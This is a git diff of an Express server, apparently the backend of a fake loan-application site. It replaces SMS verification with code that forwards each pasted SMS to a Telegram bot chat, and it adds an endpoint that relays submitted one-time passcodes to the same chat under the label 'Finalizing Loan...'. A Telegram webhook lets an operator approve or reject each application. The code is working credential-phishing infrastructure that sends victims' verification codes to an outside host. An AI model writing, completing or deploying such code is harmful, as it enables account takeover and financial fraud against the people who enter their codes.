@@ -62,26 +62,61 @@ app.get('/api/status/:id', (req, res) => {
     }
 });
 
-// 2b. Verify pasted SMS (new endpoint for the verify button)
-app.post('/api/verify-sms', (req, res) => {
-    const { sms } = req.body;
-    console.log("Pasted SMS:", sms);
-    // TODO: add real validation here (e.g., regex match, check known code)
-    // For now, accept anything non-empty
-    if (sms && sms.trim().length > 0) {
+// 2b. Forward Pasted SMS to Telegram
+app.post('/api/verify-sms', async (req, res) => {
+    const { sms, appId } = req.body;
+    
+    if (!sms) return res.json({ success: false });
+
+    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+    const message = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${sms}\n\`\`\``;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+        });
         res.json({ success: true });
-    } else {
-        res.json({ success: false });
+    } catch (error) {
+        res.status(500).json({ success: false });
     }
 });
 
-// 3. Telegram Webhook (Telegram calls this when you click a button)
+// 2c. Receive the 4-digit OTP and send to Telegram
+app.post('/api/submit-otp', async (req, res) => {
+    const { otp, appId } = req.body;
+
+    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+    const message = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
+                    `*App ID:* \`${appId}\`\n` +
+                    `*OTP Code:* \`${otp}\`\n\n` +
+                    `Status: Finalizing Loan...`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+        });
+        res.json({ success: true });
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ success: false });
+    }
+});
+
+// 3. Telegram Webhook
 app.post('/api/telegram-webhook', async (req, res) => {
     const { callback_query } = req.body;
 
     if (callback_query) {
         const data = callback_query.data; 
-        const messageId = callback_query.message.message_id; // Get the message ID
+        const messageId = callback_query.message.message_id; 
         const chatId = callback_query.message.chat.id;
         const [action, appId] = data.split('_');
 
@@ -105,7 +140,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 newStatus = "Rejected!";
             }
 
-            // EDIT THE TELEGRAM MESSAGE
             await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/editMessageText`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -114,12 +148,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     message_id: messageId,
                     text: newText,
                     parse_mode: 'Markdown',
-                    reply_markup: { inline_keyboard: [] } // This removes the buttons
+                    reply_markup: { inline_keyboard: [] } 
                 })
             });
         }
 
-        // Answer the callback so the loading circle on Telegram stops
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
